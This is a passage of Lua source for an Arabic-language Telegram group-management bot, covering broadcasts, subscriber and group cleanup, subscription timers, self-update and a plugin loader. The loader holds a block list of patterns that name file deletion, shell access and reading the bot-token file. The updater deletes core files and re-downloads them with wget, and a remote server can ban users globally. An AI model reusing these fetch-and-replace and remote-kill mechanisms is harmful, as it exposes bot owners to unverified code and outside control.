if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
function promote_by_reply(extra, result, success)
datahmade:srem('SNIEBR:'..bot_id..'creatorbasic:'..msg.chat_id_, result.sender_user_id_)
tsX000("prore",msg,'تم تنزيلة منشئ اساسي من البوت')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^تنزيل منشئ اساسي @(.*)$") then
local apmd = {string.match(text, "^(تنزيل منشئ اساسي) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
datahmade:srem('SNIEBR:'..bot_id..'creatorbasic:'..msg.chat_id_, result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR')..')\n┇ تم تنزيلة منشئ اساسي من البوت  '
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
if text:match("^تنزيل منشئ اساسي (%d+)$") then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(تنزيل منشئ اساسي) (%d+)$")}
datahmade:srem('SNIEBR:'..bot_id..'creatorbasic:'..msg.chat_id_, apmd[2])
tsX000(apmd[2],msg,"تم تنزيلة منشئ اساسي من البوت")
end
if text == 'توجيه للكل' and tonumber(msg.reply_to_message_id_) > 0  and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then  
local group = datahmade:smembers('SNIEBR:'..bot_id..'groups') 
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data) end,nil)
end
function fwwdmsg(taha,storm,sorc)  
local list = datahmade:smembers('SNIEBR:'..bot_id..'groups') 
for k,v in pairs(list) do  
tdcli_function ({
ID = "ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = storm.id_},
disable_notification_ = 1,
from_background_ = 1},cb or dl_cb,cmd) 
end
local gps = datahmade:scard('SNIEBR:'..bot_id.."groups")  
local text = '🚸 ❯❯ تم ارسال توجيه الى *{ '..gps..' }* مجموعات'  
send(msg.chat_id_, msg.id_, 1, text, 1, 'md')  
end  
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),fwwdmsg)  
end
-------------
if text == 'توجيه خاص' and tonumber(msg.reply_to_message_id_) > 0  and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then  
local pv = datahmade:smembers('SNIEBR:'..bot_id.."userss")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
end,nil)
end
function fwwdmsg(taha,storm,sorc)  
local list = datahmade:smembers('SNIEBR:'..bot_id.."userss")
for k,v in pairs(list) do  
tdcli_function ({
ID = "ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = storm.id_},
disable_notification_ = 1,
from_background_ = 1},cb or dl_cb,cmd) 
end
local gps = datahmade:scard('SNIEBR:'..bot_id.."userss")  
local text = '♻┇ تم ارسال توجيه الى *{ '..gps..' }* مشترك في الخاص'  
send(msg.chat_id_, msg.id_, 1, text, 1, 'md')  
end  
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),fwwdmsg)  
end
--------------
if text and text == "اذاعه" then 
if (not datahmade:get('SNIEBR:'..bot_id..'bc:groups') or tonumber(sudo_add) == tonumber(msg.sender_user_id_)) then
send(msg.chat_id_, msg.id_, 1, '☑┇ ارسال الان نص او الميديا : (صوره - فديو - متحركه - ملف)\n ☑┇ ارسل (الغاء) للغاء الاذاعه', 1, 'md')
datahmade:set("SNIEBR:set_if_bc_new:"..bot_id..msg.sender_user_id_,"ok")
return "SNIEBR"
else
send(msg.chat_id_, msg.id_, 1, '☑┇ الاذاعه معطله ', 1, 'md')
end
end
---------------

if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 then 
if (not datahmade:get('SNIEBR:'..bot_id..'bc:groups') or tonumber(sudo_add) == tonumber(msg.sender_user_id_)) then
datahmade:setex('SNIEBR:'..bot_id.."bc:in:pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_, 1, '☑┇ ارسال الان نص او الميديا : (صوره - فديو - متحركه - ملف)\n ☑┇ ارسل (الغاء) للغاء الاذاعه', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇ الاذاعه معطله ', 1, 'md')
end
return false
end 




if text == "تنظيف المشتركين" and tonumber(sudo_add) == tonumber(msg.sender_user_id_) then
local pv = datahmade:smembers('SNIEBR:'..bot_id.."userss")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok"  then
print('\27[30;33m»» THE USER IS SAVE ME ↓\n»» '..pv[i]..'\n\27[1;37m')
else
print('\27[30;31m»» THE USER IS BLOCK ME ↓\n»» '..pv[i]..'\n\27[1;37m')
datahmade:srem('SNIEBR:'..bot_id.."userss",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_, 1,'🔖┇ لا يوجد مشتركين وهميين في البوت \n', 1, 'md')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_, 1,'🔖┇ عدد المشتركين الان ↫ ( '..#pv..' )\n📬┇ تم ازالة ↫ ( '..sendok..' ) من المشتركين\n📌┇ الان عدد المشتركين الحقيقي ↫ ( '..ok..' ) مشترك \n', 1, 'md')   
end
end
end,nil)
end,nil)
end
return false
end
----------------
if text == "تنظيف الكروبات" and tonumber(sudo_add) == tonumber(msg.sender_user_id_) then
local group = datahmade:smembers('SNIEBR:'..bot_id..'groups') 
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
print('\27[30;34m»» THE BOT IS NOT ADMIN ↓\n»» '..group[i]..'\n\27[1;37m')
datahmade:srem("thsake:gog"..bot_id,group[i]) 
datahmade:srem('SNIEBR:'..bot_id..'pro:groups',group[i]) 
datahmade:srem( 'SNIEBR:'..bot_id.."groups",group[i]) 
changeChatMemberStatus(group[i], bot_id, "Left")
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
datahmade:srem("thsake:gog"..bot_id,group[i]) 
datahmade:srem('SNIEBR:'..bot_id..'pro:groups',group[i]) 
datahmade:srem( 'SNIEBR:'..bot_id.."groups",group[i]) 
q = q + 1
print('\27[30;35m»» THE BOT IS LEFT GROUP ↓\n»» '..group[i]..'\n\27[1;37m')
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
datahmade:srem("thsake:gog"..bot_id,group[i]) 
datahmade:srem('SNIEBR:'..bot_id..'pro:groups',group[i]) 
datahmade:srem( 'SNIEBR:'..bot_id.."groups",group[i]) 
q = q + 1
print('\27[30;36m»» THE BOT IS KICKED GROUP ↓\n»» '..group[i]..'\n\27[1;37m')
end
if data and data.code_ and data.code_ == 400 then
datahmade:srem("thsake:gog"..bot_id,group[i]) 
datahmade:srem('SNIEBR:'..bot_id..'pro:groups',group[i]) 
datahmade:srem( 'SNIEBR:'..bot_id.."groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_, 1,'🔖┇ لا يوجد مجموعات وهميه في البوت\n', 1, 'md')   
else
local taha = (w + q)
local sendok = #group - taha
if q == 0 then
taha = ''
else
taha = '\n*🚸┇ تم ازالة ↫ ❪ '..q..' ❫ مجموعات من البوت*'
end
if w == 0 then
storm = ''
else
storm = '\n*📬┇ تم ازالة ↫ ❪'..w..'❫ مجموعه لان البوت عضو*'
end
send(msg.chat_id_, msg.id_, 1,'*🔖┇ عدد المجموعات الان ↫ ( '..#group..' )*'..storm..''..taha..'\n*📌┇ الان عدد المجموعات الحقيقي ↫ ( '..sendok..' ) مجموعات*\n', 1, 'md')   
end
end
end,nil)
end
return false
end
if (text:match("^عدد الكروبات$") or text:match("^الاحصائيات$")) and is_vip(msg) then
local gps = datahmade:scard('SNIEBR:'..bot_id.."groups") or 0
local user = datahmade:scard('SNIEBR:'..bot_id.."userss") or 0
local gps2 = datahmade:scard("thsake:gog"..bot_id) or 0
local gps9 = datahmade:scard("thsake:good"..bot_id..os.date("%d")) or 0
local gps3 = datahmade:scard('SNIEBR:'..bot_id..'pro:groups') or 0
send(msg.chat_id_, msg.id_, 1, '• المجموعات :\n📊┇عدد الكروبات الكلي ~⪼  *{'..gps..'}*\n🔋┇عدد الكروبات المفعله ~⪼  *{'..gps2..'}*\n🔌┇عدد الكروبات الغير مفعله ~⪼  *{'..(gps - gps2)..'}*\n💡┇عدد الكروبات المدفوعه ~⪼  *{'..(gps3)..'}*\n⏱┇عدد الكروبات المتفاعله اليوم ~⪼  *{'..(gps9)..'}*\n\n• الاعضاء :\n👥┇ عدد اعضاء الخاص : {`'..user..'`}', 1, 'md')
end
if tonumber(sudo_add) == tonumber(msg.sender_user_id_) then
if text:match("^تفعيل الكل$") then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
local gps = datahmade:smembers('SNIEBR:'..bot_id.."groups") or 0
local gps2 = datahmade:smembers("thsake:gog"..bot_id) or 0
for i=1,#gps do
datahmade:sadd("thsake:gog"..bot_id, gps[i])
datahmade:set('SNIEBR:'..bot_id.."enable:"..gps[i],true)
datahmade:set( 'SNIEBR:'..bot_id.."charge:"..gps[i],true)
end
send(msg.chat_id_, msg.id_, 1, '🔋┇تم تفعيل ~⪼  *{'..(#gps - #gps2)..'}*', 1, 'md')
end
if text:match("^تعطيل الكل$") then
local gps = datahmade:smembers('SNIEBR:'..bot_id.."groups") or 0
local gps2 = datahmade:smembers("thsake:gog"..bot_id) or 0
for i=1,#gps do
datahmade:del("thsake:gog"..bot_id)
datahmade:del('SNIEBR:'..bot_id.."enable:"..gps[i])
datahmade:del( 'SNIEBR:'..bot_id.."charge:"..gps[i])
end
send(msg.chat_id_, msg.id_, 1, '🔌┇تم تعطيل ~⪼  *{'..#gps..'}*', 1, 'md')
end
if text:match("^مغادره الكل$") then
local gps = datahmade:smembers('SNIEBR:'..bot_id.."groups") or 0
local gps2 = datahmade:smembers("thsake:gog"..bot_id) or 0
send(msg.chat_id_, msg.id_, 1, '💣┇تم مغادره ~⪼  *{'..#gps..'}*', 1, 'md')
for i=1,#gps do
datahmade:del('SNIEBR:'..bot_id.."enable:"..gps[i])
chat_leave(msg.chat_id_, bot_id)
end
datahmade:del("thsake:gog"..bot_id)
datahmade:del('SNIEBR:'..bot_id.."groups")
end
end 
		if text == ("روابط الكروبات") then
local gpss = datahmade:smembers('SNIEBR:'..bot_id.."groups") or 0
text233 = '📊┇روابط الكروبات\n\n'
for i=1, #gpss do
local link = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..gpss[i]))
if datahmade:get('SNIEBR:'..bot_id.."group:link"..gpss[i]) then 
text233 = text233.."|"..i.."| ~⪼ "..gpss[i].."\n ~⪼ "..(datahmade:get('SNIEBR:'..bot_id.."group:link"..gpss[i])).."\n"
else
text233 = text233.."|"..i.."| ~⪼ "..gpss[i].."\n ~⪼ "..(link.result or ' لا توجد روابط ').."\n"
end
end
local f = io.open('SNIEBR_Links.txt', 'w')
f:write(text233)
f:close()
local SNIEBRe = 'https://api.telegram.org/bot' .. token .. '/sendDocument'
local curl = 'curl "' .. SNIEBRe .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'SNIEBR_Links.txt' .. '"'
io.popen(curl) 
end
		----------------
if text and (text == "الكروبات المتفاعله" or text == "روابط الكروبات المتفاعله") then
local gpss = datahmade:smembers("thsake:good"..bot_id..os.date("%d")) or 0
text233 = '📊┇روابط الكروبات المتفاعله\n\n'
for i=1, #gpss do
local link = datahmade:get('SNIEBR:'..bot_id.."group:link"..gpss[i])
text233 = text233.."|"..i.."| ~⪼ "..gpss[i].."\n ~⪼ "..(link or  "لا يوجد رابط").."\n"
end
local f = io.open('SNIEBR.txt', 'w')
f:write(text233)
f:close()
local SNIEBRe = 'https://api.telegram.org/bot' .. token .. '/sendDocument'
local curl = 'curl "' .. SNIEBRe .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'SNIEBR.txt' .. '"'
io.popen(curl)
end
if text:match("^تحديث السورس$")  and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '☑️┇تم التحديث', 1, 'md')
os.execute('rm -rf ./libs/utils.lua')
os.execute('cd libs && wget https://raw.githubusercontent.com/SNIEBRTEAM/SNIEBR/master/libs/utils.lua')
os.execute('rm -rf SNIEBR.lua')
os.execute('wget https://raw.githubusercontent.com/SNIEBRTEAM/SNIEBR/master/SNIEBR.lua')
os.exit()
return false
end
if text:match("^وضع وقت (%d+)$") then
local a = {string.match(text, "^(وضع وقت) (%d+)$")}
local time = a[2] * day
datahmade:setex( 'SNIEBR:'..bot_id.."charge:"..msg.chat_id_,time,true)
datahmade:set( 'SNIEBR:'..bot_id.."enable:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_, 1, '🔘┇تم وضع وقت انتهاء البوت *{'..a[2]..'}* يوم', 1, 'md')
end--
if text:match("^وقت المجموعه (-%d+)$") then
local txt = {string.match(text, "^(وقت المجموعه) (-%d+)$")}
local ex = datahmade:ttl( 'SNIEBR:'..bot_id.."charge:"..txt[2])
if ex == -1 then
send(msg.chat_id_, msg.id_, 1, '🔘┇وقت المجموعه لا نهائي', 1, 'md')
else
local d = math.floor(ex / day ) + 1
send(msg.chat_id_, msg.id_, 1, "❕┇عدد ايام وقت المجموعه {"..d.."} يوم", 1, 'md')
end
end
if text:match("^مغادره (-%d+)$")  then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
local txt = {string.match(text, "^(مغادره) (-%d+)$")}
send(msg.chat_id_, msg.id_, 1, '🔘┇المجموعه {'..txt[2]..'} تم الخروج منها', 1, 'md')
datahmade:del("thsake:gog"..bot_id,txt[2])
chat_leave(txt[2], bot_id)
end
if text:match('^المده1 (-%d+)$')  then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
local txt = {string.match(text, "^(المده1) (-%d+)$")}
local keko_info = nil
function keko333(extra,result,success)
keko_info = '@'..(result.username_ or 'لا يوجد')..''
local timeplan1 = 2592000
datahmade:setex( 'SNIEBR:'..bot_id.."charge:"..txt[2],timeplan1,true)
send(msg.chat_id_, msg.id_, 1, '☑┇المجموعه ('..txt[2]..') تم اعادة تفعيلها المدة 30 يوم', 1, 'md')
send(txt[2], 0, 1, '☑┇تم تفعيل مدة المجموعه 30 يوم', 1, 'md')
for k,v in pairs(sudo_users) do
function thsake_info(k1,k2)
send(v, 0, 1, "🔘┇قام بتفعيل مجموعه المده كانت 30 يوم \n🎫┇ايدي المطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ "..keko_info.."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ┇اسم المجموعه ~⪼ ("..k2.title_..")" , 1, 'md')
end
openChat(msg.chat_id_,thsake_info)
end
datahmade:set( 'SNIEBR:'..bot_id.."enable:"..txt[2],true)
end
getUser(msg.sender_user_id_, keko333)
end
if text:match('^المده2 (-%d+)$')  then
local txt = {string.match(text, "^(المده2) (-%d+)$")}
local keko_info = nil
function keko333(extra,result,success)
keko_info = '@'..(result.username_ or 'لا يوجد')..''
local timeplan2 = 7776000
datahmade:setex( 'SNIEBR:'..bot_id.."charge:"..txt[2],timeplan2,true)
send(msg.chat_id_, msg.id_, 1, '☑┇المجموعه ('..txt[2]..') تم اعادة تفعيلها المدة 90 يوم', 1, 'md')
send(txt[2], 0, 1, '☑┇تم تفعيل مدة المجموعه 90 يوم', 1, 'md')
for k,v in pairs(sudo_users) do
function thsake_info(k1,k2)
send(v, 0, 1, "🔘┇قام بتفعيل مجموعه المده كانت 90 يوم \n🎫┇ايدي المطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ "..keko_info.."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ┇اسم المجموعه ~⪼ ("..k2.title_..")" , 1, 'md')
end
openChat(msg.chat_id_,thsake_info)
end
datahmade:set( 'SNIEBR:'..bot_id.."enable:"..txt[2],true)
end
getUser(msg.sender_user_id_, keko333)
end
if text:match('^المده3 (-%d+)$')  then
local txt = {string.match(text, "^(المده3) (-%d+)$")}
local keko_info = nil
function keko333(extra,result,success)
keko_info = '@'..(result.username_ or 'لا يوجد')..''
datahmade:set( 'SNIEBR:'..bot_id.."charge:"..txt[2],true)
send(msg.chat_id_, msg.id_, 1, '☑┇المجموعه ('..txt[2]..') تم اعادة تفعيلها المدة لا نهائية', 1, 'md')
send(txt[2], 0, 1, '☑┇تم تفعيل مدة المجموعه لا نهائية', 1, 'md')
for k,v in pairs(sudo_users) do
function thsake_info(k1,k2)
send(v, 0, 1, "🔘┇قام بتفعيل مجموعه المده كانت لا نهائية \n🎫┇ايدي المطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ "..keko_info.."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ┇اسم المجموعه ~⪼ ("..k2.title_..")" , 1, 'md')
end
openChat(msg.chat_id_,thsake_info)
end
datahmade:set( 'SNIEBR:'..bot_id.."enable:"..txt[2],true)
end
getUser(msg.sender_user_id_, keko333)
end
if tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
if (msg.content_.text_ == 'الملفات' ) then
local files_SNIEBR = datahmade:smembers("files"..bot_id)
local keko = io.popen('cd files_SNIEBR && ls'):read("*all")
local files_SNIEBR2 = ''
for i=1,#files_SNIEBR do
files_SNIEBR2 = files_SNIEBR2..'{'..files_SNIEBR[i]..'}\n'
end
send(msg.chat_id_, msg.id_, 1, '☑┇جميع الملفات : \n '..keko..'\n ---------------------- \n\n✔┇الملفات المفعله \n'..files_SNIEBR2..'', 1, 'html')
end
text = msg.content_.text_
if text then
if text:match("^(تفعيل ملف) (.*)(.lua)$")then
local name_t = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}

function load(filename)
local f = io.open(filename)
if not f then
return "keko"
end
local s = f:read('*all')
f:close()
return s
end
local f = load("files_SNIEBR/"..name_t[2]..".lua")
if (f:match('^(.*)(http://botlua.tk)(.*)$')) then 
if (f:match('^(.*)(/getChatMember?chat_id=)(.*)$')) then 
ts23kk =  "\n⚠┇الف مره كلنا ما نرفع مال الفروخ \n \n دباي "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
end
if (f:match('^(.*)(-fr SNIEBR.lua)(.*)$')) then 
ts23kk =  "\n⚠┇الف مره كلنا ما نرفع مال الفروخ \n \n دباي "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(botlua.ml)(.*)$')) then 
ts23kk =  "\n⚠┇الف مره كلنا ما نرفع مال الفروخ \n \n دباي "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(SNIEBRahmad)(.*)$')) then 
ts23kk =  "\n⚠┇الف مره كلنا ما نرفع مال الفروخ \n \n دباي "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(https://raw.githubusercontent.com)(.*)$')) then 
ts23kk =  "\n⚠┇الف مره كلنا ما نرفع مال الفروخ \n \n دباي "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(-fr SNIEBR.lua)(.*)$')) then 
ts23kk =  "\n⚠┇الف مره كلنا ما نرفع مال الفروخ \n \n دباي "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
      if (f:match('^(.*)(22SNIEBR)(.*)(bot_id)(.*)$')) then 
ts23kk =  "\n⚠️┇عمي صدك جذب لول وكيكو كل يوم واحد يهينهم ما شبعتو اهانات 😹😹 \n \n دباي "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(2fmaster)(.*)(SNIEBR)(.*)(elua)(.*)$')) then 
ts23kk =  "\n⚠️┇عمي صدك جذب لول وكيكو كل يوم واحد يهينهم ما شبعتو اهانات 😹😹 \n \n دباي "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(https://botlua.tk)(.*)$')) then 
ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على دومين الفروخ \n \n دباي "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(botlua.tk)(.*)$')) then 
ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على دومين الفروخ \n \n دباي "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(rm -fr SNIEBR.lua)(.*)$')) then 
ts23kk =  "\n⚠┇مكدر ارفع ملف يحذف ملف SNIEBR.lua لتبعبص ابني "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(SNIEBR.lua)(.*)$')) then 
ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على دومين الفروخ \n \n دباي "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(t.me/HHHHD)(.*)$')) then 
ts23kk =  "\n⚠┇لا استطيع رفع ملف يحتوي على دومين الفروخ \n \n دباي "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
      if (f:match('^(.*)(/getChatMember?chat_id=)(.*)$')) then 
ts23kk =  "\n⚠┇مكدر ارفع ملف يحذف ملف SNIEBR.lua لتبعبص ابني "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(22SNIEBR%3a%22%20%2e%2e%20bot_id)(.*)$')) then 
ts23kk =  "\n⚠️┇ادري هل فروخ كيكو ولول ما يبطلون سوالفهم \n \n دباي "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(2fmaster%2fSNIEBR%2elua)(.*)$')) then 
ts23kk =  "\n⚠️┇ادري هل فروخ كيكو ولول ما يبطلون سوالفهم \n \n دباي "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
if (f:match('^(.*)(22hake)(.*)$')) then 
ts23kk =  "\n⚠️┇ادري هل فروخ كيكو ولول ما يبطلون سوالفهم \n \n دباي "
datahmade:srem("files"..bot_id,name_t[2]..'.lua')
io.popen("rm -fr files_SNIEBR/"..name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, ts23kk, 1, 'html')
return false 
end
io.popen("rm -fr files_SNIEBR/del.lua")
io.popen("rm -fr files_SNIEBR/hack.lua")
io.popen("rm -fr files_SNIEBR/d.lua")
if f ~= "keko" then
ts23 = ""
if f:match("^(.*)(keko_SNIEBR)(.*)$") then
if f:match("^(.*)(function send)(.*)$") then
ts23 = ts23 .. "\n⚠┇ارسال رسال نصيه"
end
if (f:match("^(.*)(sudo.lua)(.*)$")) then 
ts23 = ts23 .. "\n⚠┇الوصول الى توكن البوت وايدي المطور الاساسي"
end
if (f:match("^(.*)(io.popen)(.*)$")) then 
ts23 = ts23 .. "\n⚠┇الوصول الى تورمنل البوت"
end
if (f:match("^(.*)(os.execute)(.*)$")) then 
ts23 = ts23 .. "\n⚠┇الوصول الى تورمنل البوت"
end
if (f:match("^(.*)(redis)(.*)$")) then 
ts23 = ts23 .. "\n⚠┇الوصول الى خزن البوت"
end

if (f:match("^(.*)(rm -fr)(.*)$")) then 
ts23 = ts23 .. "\n⚠┇حذف ملفات او مجلدات"
end
if (f:match("^(.*)(encode)(.*)$")) then 
ts23 = ts23 .. "\n⚠┇التصال بapi خارجي"
end
if (f:match("^(.*)(api.telegram.org/bot)(.*)$")) then 
ts23 = ts23 .. "\n⚠┇قد يسبب الضعف في البوت"
end
datahmade:sadd("files"..bot_id,name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, "✔┇تم تفعيل {"..name_t[2]..".lua}\n"..ts23, 1, 'html')
else
send(msg.chat_id_, msg.id_, 1, '⚠┇عذرا لا يمكن تشغيل {'..name_t[2]..'.lua} \n❗┇لانه لا يدعم سورس سنايبر \n 🦁┇[ملفات يدعمها سورس سنايبر]((t.me/SNIEBR_files))', 1, 'md')
end
else
